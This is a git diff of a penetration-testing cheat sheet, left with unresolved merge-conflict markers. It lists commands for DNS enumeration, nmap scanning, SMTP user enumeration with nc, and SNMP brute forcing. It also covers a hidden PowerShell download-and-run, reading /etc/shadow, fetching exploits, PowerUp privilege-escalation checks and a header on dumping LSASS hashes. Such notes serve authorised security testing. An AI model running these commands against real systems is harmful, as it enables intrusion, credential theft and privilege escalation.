@@ -69,7 +69,7 @@ intitle:"VNC viewer for java"
 
 inurl:"/specific/url/"
 
-#----- DNS ENUMBERATION -----#
+# ----- DNS ENUMBERATION ----- #
 ### name server
 host -t ns domain.com
 
@@ -89,7 +89,11 @@ host -l ns DOMAIN.COM
 DNSRECON, DNSENUM
 
 
+<<<<<<< HEAD
 # ----- PORT SCANNING -----#
+=======
+# ----- PORT SCANNING ----- #
+>>>>>>> 73b97ee503b1da6a577455be54aaba608cf12162
 SYN SCANNING (half scan) 
 
 ### NMAP SCRIPTS
@@ -113,20 +117,24 @@ nmap -sn 192.168.1.1/24
 
 --open = only display results of open ports
 
+<<<<<<< HEAD
 nmap -g88 -sS -Pn -n -p 445 --open --reason 10.10.2.0/24 -oA results
 
 #----- SMB (PORT 139, 445) -----#
+=======
+# ----- SMB (PORT 139, 445) ----- #
+>>>>>>> 73b97ee503b1da6a577455be54aaba608cf12162
 ### Identify smb or netbios services
 nbtscan 192.168.1.0/24
 
-#----- SMTP (PORT 25) -----#
+# ----- SMTP (PORT 25) ----- #
 nc -nv IP ADDRESS 25
 VRFY USERID
 
 ## Bash to connect to smb from userlist
 for user in $(cat users.txt); do echo VRFY $user | nc -nv IPADDRESS 25 2>/dev/null | grep ^"250"; done
 
-#----- SNMP (PORT 161)-----#
+# ----- SNMP (PORT 161)----- #
 nmap -sU --open -p 161 IPADDRESS
 
 ### Brute force community string
@@ -146,7 +154,7 @@ snmpwalk -c public -v1 IPADDRESS 1.3.6.1.2.1.25.6.3.1.2
 SNMPENUM
 SNMPCHECK
 
-#----- VULN SCANNING -----#
+# ----- VULN SCANNING ----- #
 nmap -p 80 --script all IPADDRESS
 
 ## Other Tools
@@ -154,7 +162,7 @@ openvas-setup
 
 
 
-#----- Transferring Files from Linux to Windows -----#
+# ----- Transferring Files from Linux to  ----- #
 ### Python Webserver 
 python -m SimpleHTTPServer
 
@@ -164,13 +172,13 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -File “YourScript.ps1” 
 
 
-#----- Metasploit -----#
+# ----- Metasploit ----- #
 jobs
 sessions -i 1
 
 cme smb -U USERID -p PASSWORD --local-auth IPADDRESS
 
-#----- Windows CMD To RUN -----#
+# ----- Windows CMD To RUN ----- #
 whoami
 net user
 cmd /c
@@ -179,24 +187,46 @@ msbuild
 wscript
 netstat -an /find "LISTEN"
 
-#----- RDP from LINXU to Win -----#
+### Check if user is in local admins group
+net localgroup administrators
+
+# ----- RDP from LINXU to Win ----- #
 rdesktop -u USERID -p PASSWORD IPADDRESS -f
 
-#----- TRICKS AND TIPS -----# 
+# ----- TRICKS AND TIPS ----- #
 ### Command output on screen and on file
 ls -l 2>&1 | tee file.txt
 
 ### Convert python exploit to Windows Exe
 pywin
 
-#----- PRIVELEDGE ESCALATION -----# 
+# ----- PRIVELEDGE ESCALATION ----- # 
 
 ### DownLoad exploit with wget
 wget -O exploitName.c https://www.exploit-db.com/download/12932
 
+### FIND MISSING PATCHES
+c:\> wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+Speachsploit MS16 windows local
+
+### OTHER TOOLS
+### Source: https://wiki.securityweekly.com/TS_Episode02
+
+### PowerUp by harmj0y: https://github.com/PowerShellMafia/PowerSploit
+powershell -exec bypass
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+
+Potato by foxglovesec: https://github.com/foxglovesec/Potato
+Tater (PowerShell Implementation of Hot Potato exploit): https://github.com/Kevin-Robertson/Tater
+SessionGopher: https://github.com/fireeye/SessionGopher
+
+
 ### LINUX
 id
 cat /etc/shadow
+<<<<<<< HEAD
 
 #----- Password Dump -----# 
 ### Windows (they dump pass hashes from lsas process)
@@ -348,3 +378,6 @@ egrep -ir 'found' */dirb*
 
 #### Import Nmap scans to lair 
 ./drone-nmap_darwin_amd64 5T9mjLQEp32g8BXCH /Users/user/Downloads/verions.xml
+=======
+egrep -ir 'searchterm'
+>>>>>>> 73b97ee503b1da6a577455be54aaba608cf12162
